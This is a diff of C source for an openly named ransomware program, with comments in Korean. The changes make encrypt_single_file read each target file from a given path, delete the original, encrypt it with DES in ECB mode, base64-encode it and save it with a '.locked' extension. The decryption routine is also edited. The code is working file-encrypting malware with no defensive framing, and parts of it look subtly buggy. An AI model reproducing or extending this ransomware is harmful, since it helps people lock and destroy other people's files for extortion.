@@ -3,18 +3,25 @@
 #include "ecb.h"
 #include "ransomware.h"
 
-void encrypt_single_file(char* filename){
+void encrypt_single_file(char* filename, char* saveway){
     /*
         변수 선언 파트
     */
 
-    int filename_len = strlen(filename);
-    char* temp = ".locked";
-    char* filename_locked = char_array_init(filename_len + 7);
-    strcpy(filename_locked, filename);
-    strcat(filename_locked, temp);
+    int filename_len1 = strlen(filename);
+    int filename_len2 = strlen(saveway);
 
+    char* temp = ".locked";
+    char* filename_locked = char_array_init(filename_len1+ filename_len2 + 7);
+    strcpy(filename_locked, saveway);
+    strcat(filename_locked, filename);
+    strcat(filename_locked, temp);
     puts(filename_locked);
+
+    char* filename_path = char_array_init(filename_len1+ filename_len2);
+    strcpy(filename_path, saveway);
+    strcat(filename_path, filename);
+    puts(filename_path);
 
     //1단계: 파일에서 바이트를 추출해내기
     int raw_filelen = 0;
@@ -49,18 +56,20 @@ void encrypt_single_file(char* filename){
 
     //1단계: 파일에서 바이트를 추출해내기
     raw_filelen = filesize(filename);             //파일 길이 얻기
-    raw_byte = file_byte_read(filename);          //파일로부터 바이트 얻기
+    raw_byte = file_byte_read(filename_path);          //파일로부터 바이트 얻기
 
-    //sys_log("raw");
+    // sys_log("raw");
     //char_array_print(raw_byte, 0, WINDOW, 1);
 
+    //파일 삭제
+    remove( filename_path );
 
     //2단계: 바이트를 des에 맞는 사이즈로 바꾸기
     encap_len = encap_size(raw_byte, raw_filelen);
     encap = encapsulate_des_compatable_size(raw_byte, raw_filelen);
     encap_bit = byte_to_int(encap, encap_len);       //바이트로부터 비트 값 얻기
 
-    //sys_log("encap");
+    // sys_log("encap");
     //char_array_print(encap, 0, WINDOW, 1);
 
     // sys_log("encap bit");
@@ -70,7 +79,7 @@ void encrypt_single_file(char* filename){
     //3단계: des로 암호화 하기
     encrypted_len = encap_len * 8 ;
     encrypted = ecb_des_encrypt(encap_bit, encrypted_len);
-    sys_log("encrypted");
+    // sys_log("encrypted");
 
 
      //4단계: byte에서 bit로 바꾸기
@@ -78,7 +87,7 @@ void encrypt_single_file(char* filename){
     array_shallow_copy(encrypted_bit, encrypted, encap_len * 8);    //아직 des가 없어서 encap을 바로 씀
     encrypted_byte = int_to_byte(encrypted_bit, encap_len * 8);
 
-    sys_log("bytetobit");
+    // sys_log("bytetobit");
     //char_array_print(encrypted_byte, OFFSET, encap_len, 1);
 
 
@@ -88,14 +97,14 @@ void encrypt_single_file(char* filename){
 
     //printf("before: %d\nafter: %d\n",encap_len, encoded_len);
 
-    sys_log("encoded");
+    // sys_log("encoded");
     //char_array_print(encoded, OFFSET, encoded_len, 0);
     //printf("\n");
 
 
     //6단계: 파일로 저장하기
     file_byte_write(filename_locked, encoded, encoded_len);
-    sys_log("writed");
+    // sys_log("writed");
 
     free(raw_byte);
     free(encap);
@@ -123,7 +132,6 @@ void decrypt_single_file(char* filename_locked, char* key){
     int filename_len = strlen(filename_locked) - 7;
     char* filename = char_array_init(filename_len);
     strncpy(filename, filename_locked, filename_len);
-
     puts(filename);
 
     //7단계: 파일에서 바이트 추출하기
@@ -162,14 +170,11 @@ void decrypt_single_file(char* filename_locked, char* key){
     re_filelen = filesize(filename_locked);
     re_byte = file_byte_read(filename_locked);
 
-    sys_log("re byte");
     //char_array_print(re_byte, OFFSET, re_filelen, 0);
 
 
     //8단계: base64로 디코딩하기
-    sys_log("b");
     decoded_len = base64_decode_size(re_byte, re_filelen);
-    sys_log("a");
     decoded = base64_decode(re_byte, re_filelen);
 
     sys_log("decoded");
@@ -189,13 +194,10 @@ void decrypt_single_file(char* filename_locked, char* key){
     //12단계 복호화된 바이트의 헤더와 패딩을 제거하기
     decap = decapsulate_des_compatable_size(decrypted_byte);
     decap_len = decap_size(decoded);
-    sys_log("decaped");
 
     //13단계 파일로 다시 저장하기
-    file_byte_write(filename, decap, decap_len);
-
-
-
+    file_byte_write(filename_locked, decap, decap_len);
+    sys_log("file_byte_write");
 
 
     /*
